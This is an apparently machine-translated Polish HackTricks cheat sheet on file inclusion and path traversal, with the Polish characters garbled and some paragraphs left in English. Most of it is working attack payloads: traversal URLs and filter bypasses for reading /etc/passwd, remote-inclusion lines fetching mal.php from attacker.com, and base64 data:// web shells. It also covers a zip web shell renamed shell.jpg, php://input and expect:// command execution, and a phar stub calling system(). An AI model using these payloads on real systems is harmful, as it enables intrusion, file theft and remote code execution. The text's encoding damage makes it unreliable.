# WÅ‚Ä…czenie pliku / Traversal Å›cieÅ¼ki

<details>

<summary><strong>Naucz siÄ™ hakowaÄ‡ AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* JeÅ›li chcesz zobaczyÄ‡ swojÄ… **firmÄ™ reklamowanÄ… w HackTricks** lub **pobraÄ‡ HackTricks w formacie PDF**, sprawdÅº [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* ZdobÄ…dÅº [**oficjalne gadÅ¼ety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**RodzinÄ™ PEASS**](https://opensea.io/collection/the-peass-family), naszÄ… kolekcjÄ™ ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel siÄ™ swoimi sztuczkami hakerskimi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

<figure><img src="../../.gitbook/assets/image (1) (3) (1).png" alt=""><figcaption></figcaption></figure>

DoÅ‚Ä…cz do serwera [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy), aby komunikowaÄ‡ siÄ™ z doÅ›wiadczonymi hakerami i Å‚owcami nagrÃ³d za bÅ‚Ä™dy!

**SpostrzeÅ¼enia dotyczÄ…ce hakerstwa**\
Zajmuj siÄ™ treÅ›ciami, ktÃ³re zagÅ‚Ä™biajÄ… siÄ™ w emocje i wyzwania hakerstwa

**AktualnoÅ›ci na Å¼ywo o hakerstwie**\
BÄ…dÅº na bieÅ¼Ä…co z szybkim tempem Å›wiata hakerstwa dziÄ™ki aktualnym wiadomoÅ›ciom i spostrzeÅ¼eniom

**Najnowsze ogÅ‚oszenia**\
BÄ…dÅº na bieÅ¼Ä…co z najnowszymi programami bug bounty i waÅ¼nymi aktualizacjami platformy

**DoÅ‚Ä…cz do nas na** [**Discordzie**](https://discord.com/invite/N3FrSbmwdy) i zacznij wspÃ³Å‚pracowaÄ‡ z najlepszymi hakerami juÅ¼ dziÅ›!

## WÅ‚Ä…czenie pliku

**Zdalne wÅ‚Ä…czenie pliku (RFI):** Plik jest Å‚adowany z zdalnego serwera (najlepiej: moÅ¼esz napisaÄ‡ kod, a serwer go wykonuje). W php jest to **wyÅ‚Ä…czone** domyÅ›lnie (**allow\_url\_include**).\
**Lokalne wÅ‚Ä…czenie pliku (LFI):** Serwer Å‚aduje lokalny plik.

PodatnoÅ›Ä‡ wystÄ™puje, gdy uÅ¼ytkownik w jakiÅ› sposÃ³b moÅ¼e kontrolowaÄ‡ plik, ktÃ³ry zostanie zaÅ‚adowany przez serwer.

Podatne **funkcje PHP**: require, require\_once, include, include\_once

Ciekawe narzÄ™dzie do wykorzystania tej podatnoÅ›ci: [https://github.com/kurobeats/fimap](https://github.com/kurobeats/fimap)

## Åšlepe - InteresujÄ…ce - Pliki LFI2RCE
```python
wfuzz -c -w ./lfi2.txt --hw 0 http://10.10.10.10/nav.php?page=../../../../../../../FUZZ
```
### **Linux**

**PoÅ‚Ä…czenie kilku list LFI dla systemÃ³w \*nix i dodanie kolejnych Å›cieÅ¼ek stworzyÅ‚o tÄ™ listÄ™:**

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_linux.txt" %}

SprÃ³buj rÃ³wnieÅ¼ zmieniÄ‡ `/` na `\`\
SprÃ³buj rÃ³wnieÅ¼ dodaÄ‡ `../../../../../`

ListÄ™, ktÃ³ra wykorzystuje kilka technik do znalezienia pliku /etc/password (w celu sprawdzenia, czy istnieje podatnoÅ›Ä‡), moÅ¼na znaleÅºÄ‡ [tutaj](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-nix.txt)

### **Windows**

PoÅ‚Ä…czenie rÃ³Å¼nych list sÅ‚Ã³w:

{% embed url="https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/file_inclusion_windows.txt" %}

SprÃ³buj rÃ³wnieÅ¼ zmieniÄ‡ `/` na `\`\
SprÃ³buj rÃ³wnieÅ¼ usunÄ…Ä‡ `C:/` i dodaÄ‡ `../../../../../`

ListÄ™, ktÃ³ra wykorzystuje kilka technik do znalezienia pliku /boot.ini (w celu sprawdzenia, czy istnieje podatnoÅ›Ä‡), moÅ¼na znaleÅºÄ‡ [tutaj](https://github.com/xmendez/wfuzz/blob/master/wordlist/vulns/dirTraversal-win.txt)

### **OS X**

SprawdÅº listÄ™ LFI dla systemu Linux.

## Podstawowe LFI i bypassy

Wszystkie przykÅ‚ady dotyczÄ… lokalnego wÅ‚Ä…czenia pliku (Local File Inclusion), ale mogÄ… byÄ‡ rÃ³wnieÅ¼ stosowane do zdalnego wÅ‚Ä…czenia pliku (Remote File Inclusion) (strona=[http://myserver.com/phpshellcode.txt\\](http://myserver.com/phpshellcode.txt\)/).
```
http://example.com/index.php?page=../../../etc/passwd
```
### sekwencje przechodzenia usuniÄ™te nierekurencyjnie

When performing file inclusion attacks, it is common to encounter input validation mechanisms that strip traversal sequences (such as "../" or "..\") from user-supplied input. These mechanisms are implemented to prevent directory traversal attacks. However, they are often implemented in a non-recursive manner, which means that they only remove one occurrence of the traversal sequence at a time.

Podczas wykonywania atakÃ³w na wÅ‚Ä…czanie plikÃ³w czÄ™sto spotyka siÄ™ mechanizmy walidacji danych wejÅ›ciowych, ktÃ³re usuwajÄ… sekwencje przechodzenia (takie jak "../" lub "..\") z dostarczonych przez uÅ¼ytkownika danych. Mechanizmy te sÄ… stosowane w celu zapobiegania atakom polegajÄ…cym na przechodzeniu po katalogach. Jednak czÄ™sto sÄ… one implementowane w sposÃ³b nierekurencyjny, co oznacza, Å¼e usuwajÄ… tylko jedno wystÄ…pienie sekwencji przechodzenia na raz.

This behavior can be exploited by using multiple traversal sequences in a single request. By repeating the traversal sequence multiple times, it is possible to bypass the input validation mechanism and access files located in higher-level directories.

Takie zachowanie moÅ¼na wykorzystaÄ‡, uÅ¼ywajÄ…c wielu sekwencji przechodzenia w jednym Å¼Ä…daniu. Poprzez wielokrotne powtarzanie sekwencji przechodzenia, moÅ¼liwe jest obejÅ›cie mechanizmu walidacji danych wejÅ›ciowych i uzyskanie dostÄ™pu do plikÃ³w znajdujÄ…cych siÄ™ w wyÅ¼szych katalogach.

For example, if the input validation mechanism removes only one occurrence of "../" at a time, the following input could be used to bypass it:

Na przykÅ‚ad, jeÅ›li mechanizm walidacji danych wejÅ›ciowych usuwa tylko jedno wystÄ…pienie "../" na raz, moÅ¼na uÅ¼yÄ‡ nastÄ™pujÄ…cego wejÅ›cia, aby go obejÅ›Ä‡:

```
../../../etc/passwd
```

In this case, the input validation mechanism would remove the first occurrence of "../", resulting in the following path:

W tym przypadku mechanizm walidacji danych wejÅ›ciowych usunÄ…Å‚by pierwsze wystÄ…pienie "../", co spowodowaÅ‚oby nastÄ™pujÄ…cÄ… Å›cieÅ¼kÄ™:

```
../../etc/passwd
```

However, the second occurrence of "../" would not be removed, allowing the attacker to access the `/etc/passwd` file.

Jednak drugie wystÄ…pienie "../" nie zostanie usuniÄ™te, co umoÅ¼liwia atakujÄ…cemu dostÄ™p do pliku `/etc/passwd`.
```python
http://example.com/index.php?page=....//....//....//etc/passwd
http://example.com/index.php?page=....\/....\/....\/etc/passwd
http://some.domain.com/static/%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c/etc/passwd
```
### **Null byte (%00)**

Bypassuj dodawanie dodatkowych znakÃ³w na koÅ„cu podanego ciÄ…gu (bypass: $\_GET\['param']."php")
```
http://example.com/index.php?page=../../../etc/passwd%00
```
To jest **rozwiÄ…zane od wersji PHP 5.4**

### **Kodowanie**

MoÅ¼esz uÅ¼yÄ‡ niestandardowych kodowaÅ„, takich jak podwÃ³jne kodowanie URL (i inne):
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```
### Z istniejÄ…cego folderu

ByÄ‡ moÅ¼e back-end sprawdza Å›cieÅ¼kÄ™ folderu:
```python
http://example.com/index.php?page=utils/scripts/../../../../../etc/passwd
```
### Eksplorowanie katalogÃ³w systemu plikÃ³w na serwerze

System plikÃ³w serwera moÅ¼na eksplorowaÄ‡ rekurencyjnie, aby zidentyfikowaÄ‡ katalogi, a nie tylko pliki, za pomocÄ… okreÅ›lonych technik. Proces ten polega na okreÅ›leniu gÅ‚Ä™bokoÅ›ci katalogu i sprawdzaniu istnienia okreÅ›lonych folderÃ³w. PoniÅ¼ej przedstawiono szczegÃ³Å‚owÄ… metodÄ™ osiÄ…gniÄ™cia tego:

1. **OkreÅ›lanie gÅ‚Ä™bokoÅ›ci katalogu:**
OkreÅ›l gÅ‚Ä™bokoÅ›Ä‡ bieÅ¼Ä…cego katalogu, pobierajÄ…c pomyÅ›lnie plik `/etc/passwd` (dotyczy to serwera opartego na systemie Linux). PrzykÅ‚adowy adres URL moÅ¼e byÄ‡ zbudowany w nastÄ™pujÄ…cy sposÃ³b, wskazujÄ…c gÅ‚Ä™bokoÅ›Ä‡ trzy:
```bash
http://example.com/index.php?page=../../../etc/passwd # depth of 3
```
2. **Sondowanie folderÃ³w:**
Dodaj nazwÄ™ podejrzanego folderu (np. `private`) do adresu URL, a nastÄ™pnie przejdÅº do `/etc/passwd`. Dodatkowy poziom katalogu wymaga zwiÄ™kszenia gÅ‚Ä™bokoÅ›ci o jeden:
```bash
http://example.com/index.php?page=private/../../../../etc/passwd # depth of 3+1=4
```
3. **Interpretuj wyniki:**
OdpowiedÅº serwera wskazuje, czy folder istnieje:
- **BÅ‚Ä…d / Brak wyniku:** Folder `private` prawdopodobnie nie istnieje pod wskazanÄ… lokalizacjÄ….
- **ZawartoÅ›Ä‡ `/etc/passwd`:** Potwierdza obecnoÅ›Ä‡ folderu `private`.

4. **Rekurencyjne badanie:**
Odkryte foldery moÅ¼na dalej badaÄ‡ pod kÄ…tem podfolderÃ³w lub plikÃ³w, korzystajÄ…c z tej samej techniki lub tradycyjnych metod Local File Inclusion (LFI).

Aby badaÄ‡ foldery w rÃ³Å¼nych lokalizacjach w systemie plikÃ³w, dostosuj Å‚adunek odpowiednio. Na przykÅ‚ad, aby sprawdziÄ‡, czy `/var/www/` zawiera folder `private` (przy zaÅ‚oÅ¼eniu, Å¼e bieÅ¼Ä…cy folder znajduje siÄ™ na gÅ‚Ä™bokoÅ›ci 3), uÅ¼yj:
```bash
http://example.com/index.php?page=../../../var/www/private/../../../etc/passwd
```
### **Technika skracania Å›cieÅ¼ki**

Skracanie Å›cieÅ¼ki to metoda manipulacji Å›cieÅ¼kami plikÃ³w w aplikacjach internetowych. CzÄ™sto jest uÅ¼ywana do uzyskiwania dostÄ™pu do ograniczonych plikÃ³w poprzez obejÅ›cie pewnych Å›rodkÃ³w bezpieczeÅ„stwa, ktÃ³re dodajÄ… dodatkowe znaki na koÅ„cu Å›cieÅ¼ek plikÃ³w. Celem jest stworzenie Å›cieÅ¼ki pliku, ktÃ³ra po zmodyfikowaniu przez Å›rodek bezpieczeÅ„stwa wciÄ…Å¼ wskazuje na Å¼Ä…dany plik.

W PHP rÃ³Å¼ne reprezentacje Å›cieÅ¼ki pliku mogÄ… byÄ‡ uwaÅ¼ane za rÃ³wnowaÅ¼ne ze wzglÄ™du na charakter systemu plikÃ³w. Na przykÅ‚ad:

- `/etc/passwd`, `/etc//passwd`, `/etc/./passwd` i `/etc/passwd/` sÄ… traktowane jako ta sama Å›cieÅ¼ka.
- Gdy ostatnie 6 znakÃ³w to `passwd`, dodanie `/` na koÅ„cu (tworzÄ…c `passwd/`) nie zmienia docelowego pliku.
- Podobnie, jeÅ›li do Å›cieÅ¼ki pliku (np. `shellcode.php`) dodamy `.php`, dodanie `/.` na koÅ„cu nie zmieni dostÄ™pu do pliku.

Przedstawione przykÅ‚ady demonstrujÄ…, jak wykorzystaÄ‡ skracanie Å›cieÅ¼ki do uzyskania dostÄ™pu do `/etc/passwd`, powszechnego celu ze wzglÄ™du na swojÄ… wraÅ¼liwÄ… zawartoÅ›Ä‡ (informacje o kontach uÅ¼ytkownikÃ³w):
```
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd......[ADD MORE]....
http://example.com/index.php?page=a/../../../../../../../../../etc/passwd/././.[ADD MORE]/././.
```

```
http://example.com/index.php?page=a/./.[ADD MORE]/etc/passwd
http://example.com/index.php?page=a/../../../../[ADD MORE]../../../../../etc/passwd
```
W tych scenariuszach liczba potrzebnych przemieszczeÅ„ moÅ¼e wynosiÄ‡ okoÅ‚o 2027, ale ta liczba moÅ¼e siÄ™ rÃ³Å¼niÄ‡ w zaleÅ¼noÅ›ci od konfiguracji serwera.

- **UÅ¼ywanie segmentÃ³w kropkowych i dodatkowych znakÃ³w**:
Sekwencje przemieszczeÅ„ (`../`) poÅ‚Ä…czone z dodatkowymi segmentami kropkowymi i znakami mogÄ… byÄ‡ uÅ¼ywane do nawigacji po systemie plikÃ³w, efektywnie ignorujÄ…c doÅ‚Ä…czone ciÄ…gi przez serwer.

- **OkreÅ›lanie wymaganej liczby przemieszczeÅ„**:
Przez prÃ³bÄ™ i bÅ‚Ä…d moÅ¼na znaleÅºÄ‡ dokÅ‚adnÄ… liczbÄ™ sekwencji `../` potrzebnÄ… do nawigacji do katalogu gÅ‚Ã³wnego, a nastÄ™pnie do `/etc/passwd`, zapewniajÄ…c, Å¼e wszelkie doÅ‚Ä…czone ciÄ…gi (np. `.php`) sÄ… zneutralizowane, ale Å¼Ä…dana Å›cieÅ¼ka (`/etc/passwd`) pozostaje nietkniÄ™ta.

- **RozpoczÄ™cie od faÅ‚szywego katalogu**:
To powszechna praktyka rozpoczynania Å›cieÅ¼ki od nieistniejÄ…cego katalogu (np. `a/`). Ta technika jest stosowana jako Å›rodek ostroÅ¼noÅ›ci lub do speÅ‚nienia wymagaÅ„ logiki analizy Å›cieÅ¼ki serwera.

Podczas korzystania z technik skracania Å›cieÅ¼ki waÅ¼ne jest zrozumienie zachowania analizy Å›cieÅ¼ki serwera i struktury systemu plikÃ³w. KaÅ¼dy scenariusz moÅ¼e wymagaÄ‡ innego podejÅ›cia, a testowanie jest czÄ™sto konieczne, aby znaleÅºÄ‡ najbardziej skutecznÄ… metodÄ™.

**Ta podatnoÅ›Ä‡ zostaÅ‚a naprawiona w PHP 5.3.**

### **Sztuczki obejÅ›cia filtrÃ³w**
```
http://example.com/index.php?page=....//....//etc/passwd
http://example.com/index.php?page=..///////..////..//////etc/passwd
http://example.com/index.php?page=/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
Maintain the initial path: http://example.com/index.php?page=/var/www/../../etc/passwd
http://example.com/index.php?page=PhP://filter
```
## Zdalne uwzglÄ™dnianie plikÃ³w

W PHP jest to domyÅ›lnie wyÅ‚Ä…czone, poniewaÅ¼ **`allow_url_include`** jest ustawione na **Off**. Musi byÄ‡ ustawione na **On**, aby to dziaÅ‚aÅ‚o, a w takim przypadku moÅ¼na uwzglÄ™dniÄ‡ plik PHP z serwera i uzyskaÄ‡ zdalne wykonanie kodu (RCE):
```python
http://example.com/index.php?page=http://atacker.com/mal.php
http://example.com/index.php?page=\\attacker.com\shared\mal.php
```
JeÅ›li z jakiegoÅ› powodu **`allow_url_include`** jest ustawione na **On**, ale PHP **filtrowanie** dostÄ™pu do zewnÄ™trznych stron internetowych, [zgodnie z tym postem](https://matan-h.com/one-lfi-bypass-to-rule-them-all-using-base64/), moÅ¼na uÅ¼yÄ‡ na przykÅ‚ad protokoÅ‚u danych z base64 do dekodowania kodu PHP w formacie b64 i uzyskania zdalnego wykonania kodu (RCE):

{% code overflow="wrap" %}
```
PHP://filter/convert.base64-decode/resource=data://plain/text,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+.txt
```
{% endcode %}

{% hint style="info" %}
W poprzednim kodzie, koÅ„cÃ³wka `+.txt` zostaÅ‚a dodana, poniewaÅ¼ atakujÄ…cy potrzebowaÅ‚ ciÄ…gu znakÃ³w koÅ„czÄ…cego siÄ™ na `.txt`, wiÄ™c ciÄ…g koÅ„czy siÄ™ tym i po zdekodowaniu b64 ta czÄ™Å›Ä‡ zwrÃ³ci tylko Å›mieci, a prawdziwy kod PHP zostanie doÅ‚Ä…czony (i w zwiÄ…zku z tym, wykonany).
{% endhint %}

Inny przykÅ‚ad **bez uÅ¼ycia protokoÅ‚u `php://`** to:

{% code overflow="wrap" %}
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4+txt
```
{% endcode %}

## Python Root element

W jÄ™zyku Python w kodzie takim jak ten:
```python
# file_name is controlled by a user
os.path.join(os.getcwd(), "public", file_name)
```
JeÅ›li uÅ¼ytkownik poda **bezwzglÄ™dnÄ… Å›cieÅ¼kÄ™** do **`nazwa_pliku`**, **poprzednia Å›cieÅ¼ka jest po prostu usuniÄ™ta**:
```python
os.path.join(os.getcwd(), "public", "/etc/passwd")
'/etc/passwd'
```
To jest zamierzone zachowanie zgodnie z [dokumentacjÄ…](https://docs.python.org/3.10/library/os.path.html#os.path.join):

> JeÅ›li skÅ‚adnik jest Å›cieÅ¼kÄ… bezwzglÄ™dnÄ…, wszystkie poprzednie skÅ‚adniki sÄ… odrzucane, a Å‚Ä…czenie kontynuuje od skÅ‚adnika Å›cieÅ¼ki bezwzglÄ™dnej.

## Java Listowanie KatalogÃ³w

WyglÄ…da na to, Å¼e jeÅ›li masz Path Traversal w Javie i **poprosisz o katalog** zamiast pliku, zostanie zwrÃ³cone **listowanie katalogu**. W innych jÄ™zykach tak siÄ™ nie dzieje (o ile mi wiadomo).

## Top 25 parametrÃ³w

Oto lista 25 najwaÅ¼niejszych parametrÃ³w, ktÃ³re mogÄ… byÄ‡ podatne na lokalne wÅ‚Ä…czenie plikÃ³w (LFI) (z [linku](https://twitter.com/trbughunters/status/1279768631845494787)):
```
?cat={payload}
?dir={payload}
?action={payload}
?board={payload}
?date={payload}
?detail={payload}
?file={payload}
?download={payload}
?path={payload}
?folder={payload}
?prefix={payload}
?include={payload}
?page={payload}
?inc={payload}
?locate={payload}
?show={payload}
?doc={payload}
?site={payload}
?type={payload}
?view={payload}
?content={payload}
?document={payload}
?layout={payload}
?mod={payload}
?conf={payload}
```
## LFI / RFI za pomocÄ… wrapperÃ³w i protokoÅ‚Ã³w PHP

### php://filter

Filtry PHP pozwalajÄ… na podstawowe operacje **modyfikacji danych** przed ich odczytem lub zapisem. Istnieje 5 kategorii filtrÃ³w:

* [Filtry dla ciÄ…gÃ³w znakÃ³w](https://www.php.net/manual/en/filters.string.php):
* `string.rot13`
* `string.toupper`
* `string.tolower`
* `string.strip_tags`: Usuwa tagi z danych (wszystko pomiÄ™dzy znakami "<" i ">")
* NaleÅ¼y zauwaÅ¼yÄ‡, Å¼e ten filtr zniknÄ…Å‚ z nowszych wersji PHP
* [Filtry konwersji](https://www.php.net/manual/en/filters.convert.php)
* `convert.base64-encode`
* `convert.base64-decode`
* `convert.quoted-printable-encode`
* `convert.quoted-printable-decode`
* `convert.iconv.*` : PrzeksztaÅ‚ca dane na inny kodowanie (`convert.iconv.<input_enc>.<output_enc>`). Aby uzyskaÄ‡ **listÄ™ wszystkich obsÅ‚ugiwanych kodowaÅ„**, uruchom w konsoli: `iconv -l`

{% hint style="warning" %}
WykorzystujÄ…c filtr konwersji `convert.iconv.*`, moÅ¼na **generowaÄ‡ dowolny tekst**, co moÅ¼e byÄ‡ przydatne do pisania dowolnego tekstu lub tworzenia funkcji, ktÃ³ra przetwarza dowolny tekst. WiÄ™cej informacji znajdziesz w [**LFI2RCE via php filters**](lfi2rce-via-php-filters.md).
{% endhint %}

* [Filtry kompresji](https://www.php.net/manual/en/filters.compression.php)
* `zlib.deflate`: Kompresuje zawartoÅ›Ä‡ (przydatne przy eksfiltracji duÅ¼ej iloÅ›ci informacji)
* `zlib.inflate`: Dekompresuje dane
* [Filtry szyfrowania](https://www.php.net/manual/en/filters.encryption.php)
* `mcrypt.*` : PrzestarzaÅ‚e
* `mdecrypt.*` : PrzestarzaÅ‚e
* Inne filtry
* Uruchomienie w PHP `var_dump(stream_get_filters());` pozwala znaleÅºÄ‡ kilka **niespodziewanych filtrÃ³w**:
* `consumed`
* `dechunk`: Odwraca kodowanie HTTP chunked
* `convert.*`
```php
# String Filters
## Chain string.toupper, string.rot13 and string.tolower reading /etc/passwd
echo file_get_contents("php://filter/read=string.toupper|string.rot13|string.tolower/resource=file:///etc/passwd");
## Same chain without the "|" char
echo file_get_contents("php://filter/string.toupper/string.rot13/string.tolower/resource=file:///etc/passwd");
## string.string_tags example
echo file_get_contents("php://filter/string.strip_tags/resource=data://text/plain,<b>Bold</b><?php php code; ?>lalalala");

# Conversion filter
## B64 decode
echo file_get_contents("php://filter/convert.base64-decode/resource=data://plain/text,aGVsbG8=");
## Chain B64 encode and decode
echo file_get_contents("php://filter/convert.base64-encode|convert.base64-decode/resource=file:///etc/passwd");
## convert.quoted-printable-encode example
echo file_get_contents("php://filter/convert.quoted-printable-encode/resource=data://plain/text,Â£hellooo=");
=C2=A3hellooo=3D
## convert.iconv.utf-8.utf-16le
echo file_get_contents("php://filter/convert.iconv.utf-8.utf-16le/resource=data://plain/text,trololohellooo=");

# Compresion Filter
## Compress + B64
echo file_get_contents("php://filter/zlib.deflate/convert.base64-encode/resource=file:///etc/passwd");
readfile('php://filter/zlib.inflate/resource=test.deflated'); #To decompress the data locally
# note that PHP protocol is case-inselective (that's mean you can use "PhP://" and any other varient)
```
{% hint style="warning" %}
CzÄ™Å›Ä‡ "php://filter" jest nieczuÅ‚a na wielkoÅ›Ä‡ liter
{% endhint %}

### php://fd

Ten wrapper umoÅ¼liwia dostÄ™p do deskryptorÃ³w plikÃ³w, ktÃ³re proces ma otwarte. Potencjalnie przydatne do wydostawania zawartoÅ›ci otwartych plikÃ³w:
```php
echo file_get_contents("php://fd/3");
$myfile = fopen("/etc/passwd", "r");
```
MoÅ¼esz rÃ³wnieÅ¼ uÅ¼yÄ‡ **php://stdin, php://stdout i php://stderr** do uzyskania dostÄ™pu do **deskryptorÃ³w plikÃ³w 0, 1 i 2** odpowiednio (nie jestem pewien, jak to moÅ¼e byÄ‡ przydatne w ataku).

### zip:// i rar://

PrzeÅ›lij plik Zip lub Rar z PHPShell wewnÄ…trz i uzyskaj do niego dostÄ™p.\
Aby mÃ³c naduÅ¼ywaÄ‡ protokoÅ‚u rar, **musi byÄ‡ on specjalnie aktywowany**.
```bash
echo "<pre><?php system($_GET['cmd']); ?></pre>" > payload.php;
zip payload.zip payload.php;
mv payload.zip shell.jpg;
rm payload.php

http://example.com/index.php?page=zip://shell.jpg%23payload.php

# To compress with rar
rar a payload.rar payload.php;
mv payload.rar shell.jpg;
rm payload.php
http://example.com/index.php?page=rar://shell.jpg%23payload.php
```
### data://

`data://` is a pseudo-protocol that allows you to embed data directly into a URL. This can be useful in scenarios where you want to include small amounts of data directly in a web page or application without making an additional request to the server.

To use `data://`, you simply need to specify the MIME type of the data, followed by a comma, and then the actual data itself. For example, if you wanted to include the text "Hello, world!" in a URL, you would use the following format:

```
data:text/plain,Hello%2C%20world%21
```

In this example, `text/plain` is the MIME type for plain text, and `Hello%2C%20world%21` is the URL-encoded version of "Hello, world!".

Keep in mind that the data you include using `data://` is embedded directly in the URL, so it can be easily viewed by anyone who has access to the URL. Therefore, it is important to be cautious when using `data://` and avoid including sensitive information.

Some potential use cases for `data://` include embedding small images, CSS styles, or even JavaScript code directly in a URL. However, it is important to note that not all browsers and applications support `data://`, so it may not be universally compatible.

Overall, `data://` can be a useful tool for including small amounts of data directly in a URL, but it should be used with caution and awareness of its limitations.
```
http://example.net/?page=data://text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data://text/plain,<?php phpinfo(); ?>
http://example.net/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
http://example.net/?page=data:text/plain,<?php echo base64_encode(file_get_contents("index.php")); ?>
http://example.net/?page=data:text/plain,<?php phpinfo(); ?>
http://example.net/?page=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ZWNobyAnU2hlbGwgZG9uZSAhJzsgPz4=
NOTE: the payload is "<?php system($_GET['cmd']);echo 'Shell done !'; ?>"
```
NaleÅ¼y zauwaÅ¼yÄ‡, Å¼e ten protokÃ³Å‚ jest ograniczony przez konfiguracje php **`allow_url_open`** i **`allow_url_include`**

### expect://

Oczekiwanie musi byÄ‡ aktywowane. MoÅ¼esz wykonaÄ‡ kod uÅ¼ywajÄ…c tego:
```
http://example.com/index.php?page=expect://id
http://example.com/index.php?page=expect://ls
```
### input://

OkreÅ›l swoje dane wejÅ›ciowe w parametrach POST:
```bash
curl -XPOST "http://example.com/index.php?page=php://input" --data "<?php system('id'); ?>"
```
### phar://

Plik `.phar` moÅ¼e byÄ‡ wykorzystany do wykonania kodu PHP, gdy aplikacja internetowa korzysta z funkcji takich jak `include` do Å‚adowania plikÃ³w. PoniÅ¼szy fragment kodu PHP przedstawia tworzenie pliku `.phar`:
```php
<?php
$phar = new Phar('test.phar');
$phar->startBuffering();
$phar->addFromString('test.txt', 'text');
$phar->setStub('<?php __HALT_COMPILER(); system("ls"); ?>');
$phar->stopBuffering();
```
Aby skompilowaÄ‡ plik `.phar`, naleÅ¼y wykonaÄ‡ nastÄ™pujÄ…ce polecenie:
```bash
php --define phar.readonly=0 create_path.php
```
Po wykonaniu zostanie utworzony plik o nazwie `test.phar`, ktÃ³ry potencjalnie moÅ¼e byÄ‡ wykorzystany do wykorzystania podatnoÅ›ci na lokalne wÅ‚Ä…czenie plikÃ³w (LFI).

W przypadkach, gdy LFI wykonuje tylko odczyt pliku bez wykonywania kodu PHP wewnÄ…trz, za pomocÄ… funkcji takich jak `file_get_contents()`, `fopen()`, `file()`, `file_exists()`, `md5_file()`, `filemtime()` lub `filesize()`, moÅ¼na sprÃ³bowaÄ‡ wykorzystaÄ‡ podatnoÅ›Ä‡ na deserializacjÄ™. Ta podatnoÅ›Ä‡ jest zwiÄ…zana z odczytem plikÃ³w za pomocÄ… protokoÅ‚u `phar`.

Aby dokÅ‚adnie zrozumieÄ‡ wykorzystywanie podatnoÅ›ci na deserializacjÄ™ w kontekÅ›cie plikÃ³w `.phar`, naleÅ¼y odwoÅ‚aÄ‡ siÄ™ do dokumentu podlinkowanego poniÅ¼ej:

[Przewodnik po wykorzystywaniu podatnoÅ›ci na deserializacjÄ™ w plikach .phar](phar-deserialization.md)

{% content-ref url="phar-deserialization.md" %}
[phar-deserialization.md](phar-deserialization.md)
{% endcontent-ref %}

### WiÄ™cej protokoÅ‚Ã³w

SprawdÅº wiÄ™cej moÅ¼liwych [**protokoÅ‚Ã³w do uwzglÄ™dnienia tutaj**](https://www.php.net/manual/en/wrappers.php)**:**

* [php://memory i php://temp](https://www.php.net/manual/en/wrappers.php.php#wrappers.php.memory) â€” Zapis w pamiÄ™ci lub w pliku tymczasowym (nie jestem pewien, jak to moÅ¼e byÄ‡ przydatne w ataku na wÅ‚Ä…czenie pliku)
* [file://](https://www.php.net/manual/en/wrappers.file.php) â€” DostÄ™p do lokalnego systemu plikÃ³w
* [http://](https://www.php.net/manual/en/wrappers.http.php) â€” DostÄ™p do adresÃ³w URL HTTP(s)
* [ftp://](https://www.php.net/manual/en/wrappers.ftp.php) â€” DostÄ™p do adresÃ³w URL FTP(s)
* [zlib://](https://www.php.net/manual/en/wrappers.compression.php) â€” Strumienie kompresji
* [glob://](https://www.php.net/manual/en/wrappers.glob.php) â€” Znajdowanie Å›cieÅ¼ek pasujÄ…cych do wzorca (nie zwraca nic drukowalnego, wiÄ™c tutaj nie jest zbyt przydatne)
* [ssh2://](https://www.php.net/manual/en/wrappers.ssh2.php) â€” Secure Shell 2
* [ogg://](https://www.php.net/manual/en/wrappers.audio.php) â€” Strumienie audio (nie przydatne do odczytu dowolnych plikÃ³w)

## LFI za pomocÄ… funkcji 'assert' w PHP

Ryzyko lokalnego wÅ‚Ä…czenia plikÃ³w (LFI) w PHP jest szczegÃ³lnie wysokie, gdy korzysta siÄ™ z funkcji 'assert', ktÃ³ra moÅ¼e wykonywaÄ‡ kod wewnÄ…trz ciÄ…gÃ³w znakÃ³w. Jest to szczegÃ³lnie problematyczne, jeÅ›li wejÅ›cie zawiera znaki nawigacji po katalogach, takie jak "..", ktÃ³re sÄ… sprawdzane, ale nie sÄ… odpowiednio oczyszczane.

Na przykÅ‚ad, kod PHP moÅ¼e byÄ‡ zaprojektowany w taki sposÃ³b, aby zapobiegaÄ‡ nawigacji po katalogach, jak w poniÅ¼szym przykÅ‚adzie:
```bash
assert("strpos('$file', '..') === false") or die("");
```
